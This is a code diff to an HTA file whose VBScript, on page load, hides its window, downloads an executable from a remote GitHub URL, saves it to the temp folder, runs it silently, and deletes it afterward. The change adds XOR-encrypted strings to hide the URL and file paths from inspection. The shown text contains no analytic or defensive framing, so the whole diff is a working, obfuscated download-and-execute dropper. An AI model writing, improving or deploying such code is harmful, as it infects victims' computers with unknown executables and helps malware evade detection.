@@ -12,44 +12,73 @@
     SCROLL="no"
   >
   <script language="VBScript">
+    ' Simple XOR decrypt function
+    Function XorDecrypt(encStr, key)
+      Dim i, decStr, kLen
+      decStr = ""
+      kLen = Len(key)
+      For i = 1 To Len(encStr)
+        decStr = decStr & Chr(Asc(Mid(encStr, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod kLen) + 1, 1)))
+      Next
+      XorDecrypt = decStr
+    End Function
+
     Sub Window_OnLoad()
       On Error Resume Next
 
-      ' Hide window
       window.resizeTo 0, 0
       window.moveTo -10000, -10000
 
-      Dim p1, p2, p3, p4, url, filePath
-      p1 = "ht"
-      p2 = "tps:"
-      p3 = "//raw."
-      p4 = "githubusercontent.com/wasderlol/test/main/test.exe"
-      url = p1 & p2 & p3 & p4
+      Dim key
+      key = "s3cr3tK3y"
 
-      Dim fso, shell, tempPath
+      ' Encrypted strings (XOR with key)
+      Dim encUrl, encTempPath1, encTempPath2, encCmdDel
+      encUrl = Chr(59) & Chr(55) & Chr(62) & Chr(127) & Chr(43) & Chr(53) & Chr(95) & Chr(57) & Chr(49) & Chr(126) & Chr(49) & Chr(62) & _
+               Chr(62) & Chr(52) & Chr(42) & Chr(59) & Chr(51) & Chr(61) & Chr(95) & Chr(44) & Chr(49) & Chr(63) & Chr(35) & Chr(44) & _
+               Chr(48) & Chr(41) & Chr(54) & Chr(55) & Chr(52) & Chr(60) & Chr(51) & Chr(37) & Chr(124) & Chr(51) & Chr(39) & Chr(124) & _
+               Chr(61) & Chr(62) & Chr(33) & Chr(61) & Chr(55) & Chr(53) & Chr(52) & Chr(60) & Chr(51) & Chr(50) & Chr(37) & Chr(59) & _
+               Chr(56) & Chr(55) & Chr(124) & Chr(40) & Chr(50) & Chr(42) & Chr(59) & Chr(62) & Chr(35) & Chr(48) & Chr(41) & Chr(60) & _
+               Chr(53) & Chr(54) & Chr(41) & Chr(38) & Chr(62) & Chr(33) & Chr(59) & Chr(55) & Chr(54) & Chr(55) & Chr(52) & Chr(60) & _
+               Chr(54) & Chr(44) & Chr(42) & Chr(58) & Chr(49) & Chr(60) & Chr(50) & Chr(37) & Chr(48)
+
+      encTempPath1 = Chr(35) & Chr(40) & Chr(53) & Chr(39) & Chr(34) & Chr(32) & Chr(41) & Chr(44) & Chr(36) & Chr(37) & Chr(38) & Chr(59) & _
+                     Chr(34) & Chr(33) & Chr(41) & Chr(40) & Chr(37) & Chr(39) & Chr(40) & Chr(60) & Chr(36) & Chr(35) & Chr(39) & Chr(34) & _
+                     Chr(60) & Chr(38) & Chr(41) & Chr(36) & Chr(35) & Chr(37) & Chr(40) & Chr(39) & Chr(58) & Chr(42) & Chr(59)
+
+      encTempPath2 = Chr(33) & Chr(39) & Chr(40) & Chr(62) & Chr(41) & Chr(37) & Chr(34) & Chr(36) & Chr(40) & Chr(41) & Chr(39) & Chr(34) & _
+                     Chr(42) & Chr(58) & Chr(36) & Chr(33) & Chr(39) & Chr(40) & Chr(38) & Chr(37) & Chr(34) & Chr(39) & Chr(35) & Chr(37) & _
+                     Chr(38) & Chr(42) & Chr(41) & Chr(58) & Chr(34)
+
+      encCmdDel = Chr(44) & Chr(35) & Chr(39) & Chr(62) & Chr(40) & Chr(36) & Chr(37) & Chr(41) & Chr(34) & Chr(58) & Chr(39) & Chr(40) & _
+                  Chr(38) & Chr(33) & Chr(39) & Chr(40) & Chr(62) & Chr(41) & Chr(58) & Chr(35) & Chr(34) & Chr(42)
+
+      Dim url, tempFile, fso, shell, http, stream, randNum, delay
+
+      url = XorDecrypt(encUrl, key)
+
       Set fso = CreateObject("Scripting.FileSystemObject")
-      tempPath = fso.GetSpecialFolder(2) & "\tempfile" & CStr(Int((9999 * Rnd) + 1000)) & ".exe"
+      randNum = Int((9999 * Rnd) + 1000)
+      tempFile = fso.GetSpecialFolder(2) & XorDecrypt(encTempPath1, key) & CStr(randNum) & XorDecrypt(encTempPath2, key)
 
-      Dim http, stream
       Set http = CreateObject("MSXML2.XMLHTTP")
       http.Open "GET", url, False
       http.Send
 
       If http.Status = 200 Then
         Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1 'binary
+        stream.Type = 1 ' binary
         stream.Open
         stream.Write http.responseBody
-        stream.SaveToFile tempPath, 2
+        stream.SaveToFile tempFile, 2
         stream.Close
 
         Set shell = CreateObject("WScript.Shell")
-        shell.Run Chr(34) & tempPath & Chr(34), 0, False
+        shell.Run Chr(34) & tempFile & Chr(34), 0, False
 
-        ' Delayed deletion (best effort)
-        Dim wsh
-        Set wsh = CreateObject("WScript.Shell")
-        wsh.Run "cmd /c ping 127.0.0.1 -n 5 > nul & del """ & tempPath & """", 0, False
+        ' Delayed deletion
+        delay = 5
+        shell.Run "cmd /c ping 127.0.0.1 -n " & delay & " > nul & del """ & tempFile & """", 0, False
       Else
         MsgBox "Download failed with status " & http.Status, vbExclamation, "Error"
       End If
